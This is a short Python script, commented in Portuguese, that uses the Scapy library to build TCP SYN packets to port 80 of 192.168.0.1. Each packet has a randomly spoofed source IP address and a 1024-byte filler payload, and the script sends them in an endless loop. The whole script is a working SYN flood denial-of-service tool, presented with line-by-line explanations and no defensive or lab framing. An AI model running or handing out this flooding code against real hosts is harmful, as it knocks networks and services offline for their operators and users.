from scapy.all import *  # Importa todas as classes e funções do Scapy
from scapy.layers.inet import IP, TCP  # Importa as classes IP e TCP do módulo scapy.layers.inet

conf.use_pcap = True  # Configura o Scapy para usar o método de captura pcap que captura e analisa pacotes de rede

random_ip = RandIP()  # Gera um endereço IP aleatório
target_ip = "192.168.0.1"  # Define o endereço IP de destino

ip = IP(dst=target_ip, ttl=10, src=random_ip)  # Cria o cabeçalho IP com o endereço de destino, TTL e endereço de origem

tcp = TCP(sport=RandShort(), dport=80, flags="S")  # Cria o cabeçalho TCP com porta de origem aleatória, porta de destino 80 e flag "S" (SYN)

raw = Raw(b"X"*1024)  # Cria a carga útil RAW com 1024 bytes preenchidos com o caractere "X"

p = ip/tcp/raw  # Combina os cabeçalhos IP, TCP e a carga útil RAW para formar o pacote final

send(p, loop=1, verbose=0)  # Envia o pacote para o destino (loop=1 para enviar continuamente, verbose=0 para não exibir informações detalhadas)
